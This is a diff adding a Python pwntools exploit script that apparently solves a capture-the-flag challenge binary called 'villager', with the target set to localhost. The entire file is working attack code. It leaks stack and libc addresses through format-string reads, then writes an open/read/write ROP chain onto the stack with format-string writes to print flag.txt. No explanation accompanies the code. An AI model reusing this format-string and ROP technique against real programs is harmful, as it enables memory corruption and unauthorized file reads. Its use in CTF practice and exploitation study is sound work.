@@ -1,0 +1,112 @@
+import sys
+import logging
+import binascii
+from pwn import *
+
+logging.basicConfig(level=logging.INFO, format="%(message)s")
+#logging.disable(logging.CRITICAL)
+
+elf = ELF("./villager")
+# libc = ELF("")
+libc = elf.libc
+
+if len(sys.argv) == 2:
+    program_name = sys.argv[1]
+    target = process(program_name)
+    logging.info("***local exploit ***")
+    
+else:
+    #HOST = "ctfq.sweetduet.info"
+    #PORT = 10001
+    HOST = "localhost"
+    PORT = 4080
+    logging.info("***remote exploit ***")
+    logging.info("[*]target host : " + HOST)
+    logging.info("[*]target port : " + str(PORT))
+    target = remote(HOST, PORT)
+
+    ###address###
+
+# open_offset = 0xd24a0
+# read_offset = 0xd2920
+# write_offset = 0xd29a0
+# pop2_ret_off = 0x2a60b
+# pop3_ret_off = 0x12db2f
+
+open_offset = 0xe50a0
+read_offset = 0xe5620
+write_offset = 0xe56f0
+pop2_ret_off = 0x7e6
+pop3_ret_off = 0x79d
+
+
+    ###main###
+def main():
+    logging.info("main!!")
+    #__ = input("start?")
+    
+    ###payload### 
+    _ = target.recvuntil("name?\n")
+    target.sendline(b"AAAA%78$p")
+    buf_addr = int(target.recvuntil("\n")[8:18], 16)
+    ret_addr = buf_addr + 4
+    buf_addr = buf_addr
+    logging.info(ret_addr)
+
+    _ = target.recvuntil("name?\n")
+    target.sendline(b"BBBB%91$p")
+    main_ret_addr = target.recvuntil("\n")[8:16]
+    libc_base_addr = int(main_ret_addr, 16) - 241
+    logging.info(hex(libc_base_addr))
+    
+    open_addr = libc_base_addr + open_offset
+    read_addr = libc_base_addr + read_offset
+    write_addr = libc_base_addr + write_offset
+
+    pop2_ret_addr = libc_base_addr + pop2_ret_off
+    pop3_ret_addr = libc_base_addr + pop3_ret_off
+
+    payload_len = 4 * 14
+    
+    payload = [
+        hex(open_addr),
+        hex(pop2_ret_addr),
+        hex(buf_addr + payload_len + 4),
+        hex(0),
+        hex(read_addr),
+        hex(pop3_ret_addr),
+        hex(3),
+        hex(buf_addr + payload_len + 4),
+        hex(255),
+        hex(write_addr),
+        hex(pop3_ret_addr),
+        hex(1),
+        hex(buf_addr + payload_len + 4),
+        hex(255),
+        "flag.txt".encode('utf-8').hex(),
+    ]
+
+    for i, pay in enumerate(payload):
+        logging.info("###payload###")
+        logging.info(pay)
+        logging.info(int(pay, 16))
+        retret = hex(ret_addr + 4 * i)
+        logging.info("###retaddr###")
+        logging.info(retret)
+        
+        logging.info("[*] round " + str(i))
+        _ = target.recvuntil("name?\n")
+        target.sendline(fmtstr_payload(7, {int(retret, 16):int(pay, 16)}, numbwritten = 0, write_size='short'))
+    
+
+    ret = target.recvuntil("name?\n")
+    target.sendline("")
+    ret += target.recv(25)
+    print(ret)
+                  
+    
+if __name__ == "__main__":
+    main()
+
+
+            
